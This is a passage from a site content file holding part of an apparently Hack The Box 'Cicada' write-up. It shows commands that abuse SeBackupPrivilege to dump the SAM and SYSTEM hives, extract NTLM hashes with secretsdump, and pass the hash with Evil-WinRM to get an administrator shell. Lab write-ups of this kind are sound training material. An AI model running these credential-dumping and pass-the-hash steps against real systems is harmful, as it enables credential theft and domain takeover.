        value: 'Checking privileges revealed that Emily had SeBackupPrivilege and SeRestorePrivilege — both enabled.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'Privilege Name             State\n========================== =======\nSeBackupPrivilege          Enabled\nSeRestorePrivilege         Enabled\nSeShutdownPrivilege        Enabled',
      },
      { type: 'heading', value: 'Privilege Escalation — SeBackupPrivilege Abuse' },
      {
        type: 'text',
        value:
          'SeBackupPrivilege allows reading any file on the system, bypassing ACLs. This was used to dump the SAM and SYSTEM registry hives, which contain local account password hashes.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '# Dump registry hives\n*Evil-WinRM* PS> reg save hklm\\sam C:\\Temp\\sam\n*Evil-WinRM* PS> reg save hklm\\system C:\\Temp\\system\n\n# Download to attack machine\n*Evil-WinRM* PS> download sam\n*Evil-WinRM* PS> download system\n\n# Extract hashes with Impacket\n$ secretsdump.py -sam sam -system system LOCAL\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::',
      },
      {
        type: 'text',
        value:
          'With the Administrator NTLM hash extracted, Pass-the-Hash was used to authenticate as the domain administrator.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i CICADA-DC.cicada.htb',
      },
      { type: 'image', src: '/writeups/cicada/01.png', alt: 'Administrator shell achieved via Pass-the-Hash' },
      {
        type: 'callout',
        variant: 'note',
        value:
          'This box demonstrates a realistic credential-chaining attack path common in Active Directory environments: anonymous access → default credentials → password spraying → credential harvesting → privilege escalation. Each step builds on the previous one.',
      },
    ],
  },
];
